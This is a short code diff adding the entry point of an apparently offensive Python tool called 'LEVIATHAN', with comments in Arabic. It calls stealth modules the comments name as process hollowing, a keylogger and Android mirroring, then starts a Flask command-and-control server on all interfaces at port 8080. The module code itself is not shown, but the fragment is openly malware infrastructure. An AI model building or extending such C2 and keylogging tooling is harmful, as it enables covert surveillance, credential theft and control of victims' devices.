@@ -1,0 +1,8 @@
+if __name__ == '__main__':
+    # 1. تشغيل الوحدات الثلاث (Hollowing, Keylogger, Android Mirror)
+    print("[!] INITIALIZING LEVIATHAN HYBRID MODULES...")
+    launch_stealth_modules()
+
+    # 2. تشغيل سيرفر الـ Flask الأصلي الخاص بك (الـ 400 سطر الباقية)
+    print(f"[*] LEVIATHAN C2 SERVER STARTING ON PORT 8080")
+    app.run(host='0.0.0.0', port=8080, debug=False)
